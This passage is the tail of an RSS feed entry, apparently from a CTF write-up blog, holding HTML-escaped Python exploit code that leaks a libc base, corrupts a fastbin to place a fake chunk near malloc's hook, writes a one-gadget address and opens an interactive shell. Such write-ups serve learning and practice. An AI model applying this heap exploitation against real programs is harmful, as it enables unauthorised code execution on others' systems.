class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;55&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;hex&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;libc_base&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;56&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;allocate&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x60&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;57&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;free&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;58&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;payload&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;libc_base&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x3c4aed&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;59&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;fill&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;payload&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;60&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;allocate&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x60&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;61&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;allocate&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x60&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;62&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;gdb&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;attach&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;r&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;63&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;payload&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;p8&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;libc_base&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x4526a&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;64&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;fill&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;payload&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;65&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;pause&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;66&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;allocate&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;255&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;67&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;r&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;interactive&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt; ]]></description>
        </item>
    </channel>
</rss>
